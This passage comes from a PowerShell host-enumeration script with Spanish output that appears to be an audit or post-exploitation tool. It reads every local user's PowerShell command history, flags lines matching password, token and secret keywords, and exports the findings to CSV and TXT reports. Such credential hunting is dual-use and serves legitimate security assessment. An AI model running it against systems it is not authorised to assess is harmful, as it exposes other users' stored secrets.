$userDirectories = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue

if ($userDirectories) {
    foreach ($userDir in $userDirectories) {
        $username = $userDir.Name
        $historyPath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        
        Write-Host "`n[*] Verificando usuario: $username" -ForegroundColor White
        
        if (Test-Path $historyPath) {
            Write-Host "[!] Historial encontrado para $username" -ForegroundColor Green
            Write-Host "    Ruta: $historyPath" -ForegroundColor Yellow
            
            try {
                $historyContent = Get-Content -Path $historyPath -Tail 10 -ErrorAction Stop
                Write-Host "    ultimos comandos:" -ForegroundColor Cyan
                
                $lineCount = 1
                foreach ($line in $historyContent) {
                    if ($line -match "password|pass|pwd|credencial|key|token|secret|login|user") {
                        Write-Host "      $lineCount. $line" -ForegroundColor Red
                    } else {
                        Write-Host "      $lineCount. $line" -ForegroundColor Gray
                    }
                    $lineCount++
                }
                
                Add-Finding -Category "PowerShell History" -Finding "History found for $username" -Risk "Medium" -Details "Path: $historyPath`nLast commands: `n$($historyContent -join "`n")"
                
            } catch {
                Write-Host "    [!] Error leyendo el historial: $($_.Exception.Message)" -ForegroundColor DarkGray
            }
        } else {
            Write-Host "[*] No se encontro historial para $username" -ForegroundColor DarkGray
            Add-Finding -Category "PowerShell History" -Finding "No history for $username" -Risk "Info" -Details "No PowerShell history file found for this user"
        }
    }
} else {
    Write-Host "[!] No se pudieron enumerar los directorios de usuario en C:\Users" -ForegroundColor Red
}

$currentUserHistory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $currentUserHistory) {
    Write-Host "`n[*] Historial del usuario actual ($env:USERNAME):" -ForegroundColor Green
    try {
        $currentHistory = Get-Content -Path $currentUserHistory -Tail 10 -ErrorAction Stop
        foreach ($line in $currentHistory) {
            if ($line -match "password|pass|pwd|credencial|key|token|secret") {
                Write-Host "  [!] $line" -ForegroundColor Red
            } else {
                Write-Host "  $line" -ForegroundColor Gray
            }
        }
    } catch {
        Write-Host "  [!] Error leyendo historial actual: $($_.Exception.Message)" -ForegroundColor DarkGray
    }
} else {
    Write-Host "`n[*] No se encontro historial para el usuario actual" -ForegroundColor DarkGray
}

Write-Host "`n[+] Nota: El historial completo puede contener informacion sensible como:" -ForegroundColor Yellow
Write-Host "    - passwords en texto plano" -ForegroundColor Red
Write-Host "    - Comandos de conexion a sistemas" -ForegroundColor Red
Write-Host "    - Credenciales de API" -ForegroundColor Red
Write-Host "    - Rutas de archivos sensibles" -ForegroundColor Red


# ================= EXPORTACIoN DE RESULTADOS =================
Show-Section "Exporting Results"

Try {

    $csvPath = "$outputFile.csv"
    $global:Findings | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
    Write-Host "[+] Resultados exportados a CSV: $csvPath" -ForegroundColor Green
    
    $txtPath = "$outputFile.txt"
    $report = @()
    $report += "======== INVOKE-ENUM REPORT ========"
    $report += "Generated: $(Get-Date)"
    $report += "Computer: $env:COMPUTERNAME"
    $report += "User: $env:USERNAME"
    $report += "=====================================`n"
    
    foreach ($finding in $global:Findings) {
        $report += "[$($finding.Timestamp)] [$($finding.Category)] [$($finding.RiskLevel)]"
        $report += "Finding: $($finding.Finding)"
        $report += "Details: $($finding.Details)"
        $report += "-------------------------------------"
    }
    
    $report | Out-File -FilePath $txtPath -Encoding UTF8
    Write-Host "[+] Reporte completo exportado a TXT: $txtPath" -ForegroundColor Green
    
} catch {
    Write-Host "[!] Error exportando resultados: $($_.Exception.Message)" -ForegroundColor Red
}

# ================= TIEMPO DE EJECUCIoN =================
$endTime = Get-Date
$duration = $endTime - $startTime
Write-Host "`n==========================================" -ForegroundColor Green
Write-Host "Ejecucion completada en: $($duration.ToString('mm\:ss')) minutos" -ForegroundColor Green
Write-Host "Total de hallazgos: $($global:Findings.Count)" -ForegroundColor Green
Write-Host "Archivos generados: $outputFile.{csv,txt}" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green
